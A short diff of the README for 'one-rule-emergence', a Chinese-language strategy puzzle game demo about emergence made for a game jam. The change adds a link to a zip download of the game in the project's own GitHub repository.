@@ -1,6 +1,6 @@
 # one-rule-emergence
 # 规则只许加一条 · 涌现实验室
-
+https://github.com/mist0268-T/one-rule-emergence/blob/main/one-rule-emergence-v06-github.zip
 > 每轮只加一条规则，秩序会从哪里出现？
 
 《规则只许加一条》是一款围绕 “涌现” 主题制作的策略解谜游戏，也是聚光灯 Game Jam 的个人可玩 Demo。
